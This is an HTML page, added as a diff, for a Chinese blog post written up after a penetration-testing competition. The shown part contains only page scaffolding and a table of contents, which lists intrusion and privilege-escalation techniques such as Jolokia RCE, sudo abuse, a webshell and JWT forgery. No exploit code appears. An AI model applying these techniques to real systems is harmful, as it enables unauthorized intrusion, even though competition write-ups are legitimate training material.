@@ -1,0 +1,1051 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    破阵阁-渗透实战挑战赛 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="404号节点   Jolokia RCE 目录扫描发现&#x2F;actuator泄露    访问&#x2F;actuator&#x2F;jolokia&#x2F;list找出能利用的MBean  给ai分析得到一个自定义的Bean: 123456789101112&quot;com.example&quot;:&#123;  &quot;type&#x3D;Diagnostics&quot;:&#123;    &quot;op&quot;:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="破阵阁-渗透实战挑战赛">
+<meta property="og:url" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="404号节点   Jolokia RCE 目录扫描发现&#x2F;actuator泄露    访问&#x2F;actuator&#x2F;jolokia&#x2F;list找出能利用的MBean  给ai分析得到一个自定义的Bean: 123456789101112&quot;com.example&quot;:&#123;  &quot;type&#x3D;Diagnostics&quot;:&#123;    &quot;op&quot;:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613150533089.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613150931263.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151051376.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151328599.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151415485.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613151521078.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613153945944.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613160116495.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613162140129.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614154149658.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613164848377.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165513491.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165524927.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165621356.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165830477.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613165942427.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170400116.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170559565.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613170855761.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171135986.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171143158.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171830241.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172000597.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172401880.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613172506392.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171413947.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171408096.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614160333519.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171437022.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613171443006.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153428385.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153545130.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614153856150.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614164501781.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165100761.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165139628.png">
+<meta property="og:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260614165202612.png">
+<meta property="article:published_time" content="2026-06-13T07:04:52.000Z">
+<meta property="article:modified_time" content="2026-06-14T08:55:15.520Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/06/13/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B/%E7%A0%B4%E9%98%B5%E9%98%81-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E6%8C%91%E6%88%98%E8%B5%9B.assets/image-20260613150533089.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="破阵阁-渗透实战挑战赛">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">破阵阁-渗透实战挑战赛</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#404%E5%8F%B7%E8%8A%82%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 404号节点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jolokia-rce"><span class="toc-number">1.1.</span> <span class="toc-text"> Jolokia RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1tar%E9%80%9A%E9%85%8D%E7%AC%A6%E6%8F%90%E6%9D%83%E8%87%B3sysadmin"><span class="toc-number">1.2.</span> <span class="toc-text"> 定时任务tar通配符提权至sysadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudoperf-stat%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="toc-number">1.3.</span> <span class="toc-text"> sudo+perf stat提权至root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text"> 日志审计系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text"> 换行命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#logrotate-%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text"> Logrotate 提权利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text"> 默认配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jupyter"><span class="toc-number">3.1.</span> <span class="toc-text"> jupyter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83-pip"><span class="toc-number">3.2.</span> <span class="toc-text"> SUDO提权-pip</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E4%B8%AD%E7%AA%A5%E8%B1%B9"><span class="toc-number">4.</span> <span class="toc-text"> 管中窥豹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jenkins-%E5%90%8E%E5%8F%B0rce"><span class="toc-number">4.1.</span> <span class="toc-text"> Jenkins 后台RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83-awk"><span class="toc-number">4.2.</span> <span class="toc-text"> SUDO提权-awk</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9A%97%E6%B8%A1%E9%99%88%E4%BB%93%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text"> 暗渡陈仓(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ghost-bits-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> Ghost Bits 上传绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE"><span class="toc-number">5.2.</span> <span class="toc-text"> 获取数据库凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E5%86%B0%E8%9D%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.3.</span> <span class="toc-text"> UDF提权+冰蝎自定义代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0so%E7%BC%96%E8%AF%91%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.1.</span> <span class="toc-text"> 上传so编译文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-jdbc-%E5%86%99%E5%85%A5%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B9%B6%E5%88%9B%E5%BB%BA-udf"><span class="toc-number">5.3.2.</span> <span class="toc-text"> 通过 JDBC 写入插件目录并创建 UDF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">5.4.</span> <span class="toc-text"> 攻击链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E9%94%81%E5%8F%8D%E5%BA%94%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text"> 连锁反应(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n8n%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.1.</span> <span class="toc-text"> n8n信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-type-%E6%B7%B7%E6%B7%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">6.2.</span> <span class="toc-text"> Content-Type 混淆任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AE%A1%E7%90%86%E5%91%98-jwt"><span class="toc-number">6.3.</span> <span class="toc-text"> 伪造管理员 JWT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%B9%B6%E6%89%A7%E8%A1%8C-code-%E8%8A%82%E7%82%B9"><span class="toc-number">6.4.</span> <span class="toc-text"> 创建并执行 Code 节点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE-2"><span class="toc-number">6.5.</span> <span class="toc-text"> 攻击链</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
